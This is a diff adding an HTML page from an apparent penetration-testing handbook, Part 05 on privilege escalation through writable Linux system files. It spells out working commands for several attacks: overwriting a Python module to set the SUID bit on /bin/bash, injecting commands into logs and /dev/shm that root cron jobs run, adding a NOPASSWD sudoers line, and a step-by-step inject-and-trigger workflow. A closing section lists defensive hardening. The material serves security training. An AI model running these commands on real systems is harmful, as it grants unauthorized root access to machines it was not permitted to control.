+find<span class="w"> </span>/usr/lib/python*<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Override system module</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/usr/lib/python3/dist-packages/requests/__init__.py<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">import os</span>
+<span class="s">os.system("chmod +s /bin/bash")</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Any Python script using 'requests' executes as root</span>
+<span class="c1"># If system service uses it, privilege escalation</span>
+</code></pre></div>
+<hr/>
+<h3 id="7-writable-log-files-command-injection">7. Writable Log Files (Command Injection)<a aria-label="Link to this section" class="g-anchor" href="#7-writable-log-files-command-injection">#</a></h3>
+<p>Some log files are processed by root scripts. Injecting log entries can lead to command injection.</p>
+<p><strong>Example - /var/log/auth.log</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If log file is processed by a cron script:</span>
+<span class="c1"># Cron script might grep logs and run commands</span>
+
+<span class="c1"># Inject command</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'malicious_command'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/var/log/auth.log
+<span class="c1"># Cron script executes the log content</span>
+</code></pre></div>
+<p><strong>Practical Scenario</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Cron script doing: grep "ERROR" /var/log/app.log | while read line; do $line; done</span>
+<span class="c1"># Attacker writes to /var/log/app.log:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'chmod +s /bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/var/log/app.log
+<span class="c1"># Cron executes it as root</span>
+</code></pre></div>
+<hr/>
+<h3 id="8-suid-binary-with-writable-library-dependencies">8. SUID Binary with Writable Library Dependencies<a aria-label="Link to this section" class="g-anchor" href="#8-suid-binary-with-writable-library-dependencies">#</a></h3>
+<p>If an SUID binary uses a shared library that's writable.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find SUID binary</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check its library dependencies</span>
+ldd<span class="w"> </span>/usr/bin/suid_binary
+
+<span class="c1"># If a library is writable:</span>
+vim<span class="w"> </span>/lib/libssl.so.1.1
+<span class="c1"># Add malicious code in library constructor</span>
+</code></pre></div>
+<p><strong>Caveat</strong>: Libraries often get replaced during updates. Persistent backdoor requires more work.</p>
+<hr/>
+<h3 id="9-writable-kernel-modules">9. Writable Kernel Modules<a aria-label="Link to this section" class="g-anchor" href="#9-writable-kernel-modules">#</a></h3>
+<p>If kernel modules (<code>.ko</code> files) are writable, root can be escalated.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find writable kernel modules</span>
+find<span class="w"> </span>/lib/modules/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.ko"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Create malicious module</span>
+<span class="c1"># Or modify existing module to execute code on load</span>
+
+<span class="c1"># Load modified module</span>
+insmod<span class="w"> </span>/path/to/malicious_module.ko
+</code></pre></div>
+<hr/>
+<h3 id="10-writable-devices-and-special-files">10. Writable Devices and Special Files<a aria-label="Link to this section" class="g-anchor" href="#10-writable-devices-and-special-files">#</a></h3>
+<h4 id="a-dev-mem-writable-memory">A. /dev/mem (Writable Memory)<a aria-label="Link to this section" class="g-anchor" href="#a-dev-mem-writable-memory">#</a></h4>
+<p>If writable, can modify kernel memory.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check permissions</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/dev/mem
+<span class="c1"># If writable, use memory manipulation tools</span>
+</code></pre></div>
+<h4 id="b-dev-shm">B. /dev/shm<a aria-label="Link to this section" class="g-anchor" href="#b-dev-shm">#</a></h4>
+<p>Writable shared memory that root scripts might use.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Cron script reads from /dev/shm/tempfile</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/shm/tempfile
+<span class="c1"># Cron executes content</span>
+</code></pre></div>
+<hr/>
+<h3 id="11-practical-exploitation-workflow">11. Practical Exploitation Workflow<a aria-label="Link to this section" class="g-anchor" href="#11-practical-exploitation-workflow">#</a></h3>
+<p><strong>Step 1: Identify All Writable System Files</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Comprehensive enumeration</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>!<span class="w"> </span>-path<span class="w"> </span><span class="s2">"/proc/*"</span><span class="w"> </span>!<span class="w"> </span>-path<span class="w"> </span><span class="s2">"/sys/*"</span><span class="w"> </span>!<span class="w"> </span>-path<span class="w"> </span><span class="s2">"/dev/*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>writable_files.txt
+
+<span class="c1"># Filter for critical files</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"/etc/|/bin/|/usr/bin/|/usr/sbin/|/lib/|/usr/lib/|/var/spool/cron|/etc/cron"</span><span class="w"> </span>writable_files.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>critical_writable.txt
+</code></pre></div>
+<p><strong>Step 2: Prioritize Based on Likely Root Execution</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check cron files (run as root)</span>
+find<span class="w"> </span>/etc/cron*<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="c1"># Check init scripts (run at boot or service start)</span>
+find<span class="w"> </span>/etc/init.d/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="c1"># Check systemd units</span>
+find<span class="w"> </span>/etc/systemd/system<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="c1"># Check PATH scripts</span>
+<span class="k">for</span><span class="w"> </span>dir<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">' '</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>find<span class="w"> </span><span class="nv">$dir</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</code></pre></div>
+<p><strong>Step 3: Determine Execution Context</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Search for references to the file in root-owned scripts</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"writable_script.sh"</span><span class="w"> </span>/etc/<span class="w"> </span>/var/spool/cron/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check if file is used by any service</span>
+systemctl<span class="w"> </span>list-dependencies<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>writable_script
+</code></pre></div>
+<p><strong>Step 4: Inject Payload</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># For scripts: append shell escape</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/path/to/writable_script
+
+<span class="c1"># For configs: add malicious directives</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user ALL=(ALL) NOPASSWD:ALL'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/sudoers.d/user
+</code></pre></div>
+<p><strong>Step 5: Trigger Execution</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Wait for cron</span>
+<span class="c1"># Restart service</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>servicename
+<span class="c1"># Trigger via other user activity</span>
+<span class="c1"># Force reboot (if script is startup)</span>
+</code></pre></div>
+<p><strong>Step 6: Verify Escalation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if /bin/bash has SUID bit</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/bin/bash
+<span class="c1"># Execute with -p to preserve privileges</span>
+/bin/bash<span class="w"> </span>-p
+<span class="c1"># Or use backup shell</span>
+/tmp/backdoor<span class="w"> </span>-p
+</code></pre></div>
+<hr/>
+<h3 id="12-defensive-measures">12. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#12-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Regular Audits</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Daily scan for new writable files</span>
+find<span class="w"> </span>/etc<span class="w"> </span>/bin<span class="w"> </span>/usr/bin<span class="w"> </span>/sbin<span class="w"> </span>/usr/sbin<span class="w"> </span>/lib<span class="w"> </span>/usr/lib<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>!<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Integrate into monitoring</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Strict Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Reset permissions on system directories</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc<span class="w"> </span>/bin<span class="w"> </span>/usr/bin<span class="w"> </span>/sbin<span class="w"> </span>/usr/sbin<span class="w"> </span>/lib<span class="w"> </span>/usr/lib
+chmod<span class="w"> </span><span class="m">644</span><span class="w"> </span>/etc/passwd<span class="w"> </span>/etc/shadow<span class="w"> </span>/etc/sudoers
+chmod<span class="w"> </span><span class="m">644</span><span class="w"> </span>/etc/crontab<span class="w"> </span>/etc/ld.so.conf
+
+<span class="c1"># Remove world-writable permissions</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span>-exec<span class="w"> </span>chmod<span class="w"> </span>o-w<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Immutable Files</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Protect critical files</span>
+chattr<span class="w"> </span>+i<span class="w"> </span>/etc/passwd
+chattr<span class="w"> </span>+i<span class="w"> </span>/etc/shadow
+chattr<span class="w"> </span>+i<span class="w"> </span>/etc/sudoers
+chattr<span class="w"> </span>+i<span class="w"> </span>/etc/crontab
+<span class="c1"># Only root can modify with chattr -i</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Filesystem Mount Options</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Mount /tmp and /var/tmp with noexec,nosuid</span>
+mount<span class="w"> </span>-o<span class="w"> </span>remount,noexec,nosuid<span class="w"> </span>/tmp
+mount<span class="w"> </span>-o<span class="w"> </span>remount,noexec,nosuid<span class="w"> </span>/var/tmp
+</code></pre></div>
+</li>
+<li>
+<p><strong>Integrity Checking</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Use AIDE or Tripwire</span>
+aide<span class="w"> </span>--init
+aide<span class="w"> </span>--check
+
+<span class="c1"># Debian/Ubuntu: debsums</span>
+debsums<span class="w"> </span>-c<span class="w">  </span><span class="c1"># Check for modified files</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>SELinux/AppArmor</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Enable SELinux to restrict file access</span>
+setenforce<span class="w"> </span><span class="m">1</span>
+<span class="c1"># Or AppArmor</span>
+aa-enforce<span class="w"> </span>/etc/apparmor.d/*
+</code></pre></div>
+</li>
+<li>
+<p><strong>Monitor Write Attempts</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Auditd rules for file writes</span>
+auditctl<span class="w"> </span>-w<span class="w"> </span>/etc/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>system_config
+auditctl<span class="w"> </span>-w<span class="w"> </span>/bin/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>bin_changes
+auditctl<span class="w"> </span>-w<span class="w"> </span>/usr/bin/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>usr_bin_changes
+</code></pre></div>
+</li>
+<li>
+<p><strong>Secure Cron Directories</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Restrict cron directories</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/cron.d
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/cron.hourly
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/cron.daily
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/cron.weekly
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/cron.monthly
+</code></pre></div>
+</li>
+</ol>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 05 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/04-cron-jobs.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 04</span><strong>Cron Jobs</strong></a><a class="g-chapter-card" href="../privesc/06-path-hijacking.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 06</span><strong>PATH Hijacking</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#writable-system-files-for-privilege-escalation" data-toc-link>Writable System Files for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-the-attack-surface" data-toc-link>1. Understanding the Attack Surface</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-writable-system-files" data-toc-link>2. Enumeration: Finding Writable System Files</a><a class="g-toc-link depth-3" href="#3-writable-scripts-sh-py-pl-rb" data-toc-link>3. Writable Scripts (.sh, .py, .pl, .rb)</a><a class="g-toc-link depth-3" href="#4-writable-configuration-files" data-toc-link>4. Writable Configuration Files</a><a class="g-toc-link depth-3" href="#5-writable-profile-and-environment-files" data-toc-link>5. Writable Profile and Environment Files</a><a class="g-toc-link depth-3" href="#6-writable-directories-with-dynamic-loading" data-toc-link>6. Writable Directories with Dynamic Loading</a><a class="g-toc-link depth-3" href="#7-writable-log-files-command-injection" data-toc-link>7. Writable Log Files (Command Injection)</a><a class="g-toc-link depth-3" href="#8-suid-binary-with-writable-library-dependencies" data-toc-link>8. SUID Binary with Writable Library Dependencies</a><a class="g-toc-link depth-3" href="#9-writable-kernel-modules" data-toc-link>9. Writable Kernel Modules</a><a class="g-toc-link depth-3" href="#10-writable-devices-and-special-files" data-toc-link>10. Writable Devices and Special Files</a><a class="g-toc-link depth-3" href="#11-practical-exploitation-workflow" data-toc-link>11. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#12-defensive-measures" data-toc-link>12. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 05 / 13 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
